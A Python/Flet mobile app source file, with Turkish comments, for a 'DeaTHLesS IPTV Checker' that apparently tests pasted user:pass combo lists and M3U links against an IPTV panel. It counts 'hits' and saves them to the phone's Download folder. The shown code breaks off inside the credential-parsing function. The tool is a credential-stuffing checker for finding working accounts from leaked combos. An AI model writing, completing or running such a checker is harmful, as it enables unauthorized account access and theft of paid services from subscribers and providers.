import flet as ft
import requests
import re
import os

def main(page: ft.Page):
    page.title = "DeaTHLesS IPTV Checker"
    page.theme_mode = ft.ThemeMode.DARK
    page.window_width = 450
    page.window_height = 800
    
    hits = []
    
    # Başlık ve Sayaçlar
    title = ft.Text("DEATHLESS CHECKER", size=28, weight="bold", color="indigo")
    hit_text = ft.Text("0", size=40, color="green", weight="bold")
    bad_text = ft.Text("0", size=40, color="red", weight="bold")

    # Giriş Alanları
    m3u_input = ft.TextField(label="M3U Linklerini Buraya Yapıştır", multiline=True, min_lines=5)
    panel_url = ft.TextField(label="Panel Adresi (http://host:port)", hint_text="http://la27.xyz:8080")
    combo_input = ft.TextField(label="Combo (user:pass) Yapıştır", multiline=True, min_lines=5)

    # Dosya Kaydetme Fonksiyonu
    def save_hits(e):
        if not hits:
            page.snack_bar = ft.SnackBar(ft.Text("Kaydedilecek HIT yok!"))
            page.snack_bar.open = True
            page.update()
            return
        
        file_name = f"DeaTHLesS-{len(hits)}xHit.txt"
        content = "\n".join(hits)
        
        # Dosyayı telefonun ana dizinine veya Download klasörüne yazar
        try:
            with open(f"/storage/emulated/0/Download/{file_name}", "w", encoding="utf-8") as f:
                f.write(content)
            msg = f"Dosya İndirilenler'e kaydedildi: {file_name}"
        except:
            with open(file_name, "w", encoding="utf-8") as f:
                f.write(content)
            msg = "Dosya uygulama dizinine kaydedildi."
            
        page.snack_bar = ft.SnackBar(ft.Text(msg))
        page.snack_bar.open = True
        page.update()

    def check_link(url_str):
        try:
            # User ve Pass ayıklama
            user = re.search(r'username=([^&]+)', url_str).group(1)
            pw =
